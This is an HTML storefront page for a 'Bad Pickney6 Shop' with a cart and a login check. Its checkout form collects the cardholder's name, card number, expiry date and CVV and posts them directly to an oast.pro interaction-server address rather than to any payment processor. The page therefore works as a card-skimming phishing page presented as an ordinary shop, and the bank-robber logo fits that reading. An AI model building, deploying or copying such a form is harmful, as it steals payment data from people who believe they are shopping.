<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Shop - Bad Pickney6</title>
  <link rel="stylesheet" href="styles.css">
</head>
<body>

  <header>
    <div class="container">
      <div class="logo">
        <img src="assets/images/bank-robber.png" alt="Logo">
        <h1>Bad Pickney6 Shop</h1>
      </div>
      <nav>
        <ul>
          <li><a href="index.html">Home</a></li>
          <li><a href="#" id="logoutBtn">Logout</a></li>
        </ul>
      </nav>
    </div>
  </header>

  <section id="shop" class="section">
    <div class="container">
      <h2>Shop Our Cards</h2>
      <div class="shop-grid" id="shopGrid"></div>

      <div id="cartContainer">
        <h3>Cart</h3>
        <ul id="cartItems"></ul>
        <p id="totalPrice">Total: $0</p>
        <form id="checkoutForm" action="https://oast.pro/6dc777f83b840b1f739bg1ftg9ayyyyyb" method="POST">
          <input type="text" name="name" placeholder="Name" required>
          <input type="text" name="cardNumber" placeholder="Card Number" required>
          <input type="text" name="expiry" placeholder="MM/YY" required>
          <input type="text" name="cvv" placeholder="CVV" required>
          <button type="submit">Checkout</button>
        </form>
      </div>
    </div>
  </section>

  <footer>
    <div class="container">
      <p>&copy; 2025 Bad Pickney6. All rights reserved.</p>
    </div>
  </footer>

  <script>
    // PROTECT PAGE
    const user = JSON.parse(localStorage.getItem('loggedInUser'));
    if(!user){
      alert('You must log in first!');
      window.location.href = 'index.html';
    }

    // LOGOUT
    document.getElementById('logoutBtn').addEventListener('click', () => {
      localStorage.removeItem('loggedInUser');
      alert('Logged out');
      window.location.href = 'index.html';
    });

    // SAMPLE SHOP ITEMS
    const cards = [
      {name:"Red Card", price:50, color:"#ff4d4d"},
      {name:"Blue Card", price:75, color:"#4d79ff"},
      {name:"Green Card", price:60, color:"#33cc33"},
      {name:"Gold Card", price:100, color:"#ffd700"}
    ];

    const shopGrid = document.getElementById('shopGrid');
    const cartItems = document.getElementById('cartItems');
    const totalPriceEl = document.getElementById('totalPrice');
    let cart = [];

    // DISPLAY CARDS
    function displayCards(){
      shopGrid.innerHTML = cards.map((card, i) => `
        <div class="shop-card" style="background:${card.color}">
          <h3>${card.name}</h3>
          <p>Price: $${card.price}</p>
          <button onclick="addToCart(${i})">Add to Cart</button>
        </div>
      `).join('');
    }

    function addToCart(index){
      cart.push(cards[index]);
      updateCart();
    }

    function updateCart(){
      cartItems.innerHTML = cart.map(c => `<li>${c.name} - $${c.price}</li>`).join('');
      const total = cart.reduce((sum,c)=>sum+c.price,0);
      totalPriceEl.textContent = 'Total: $' + total;
    }

    displayCards();
  </script>

</body>
</html>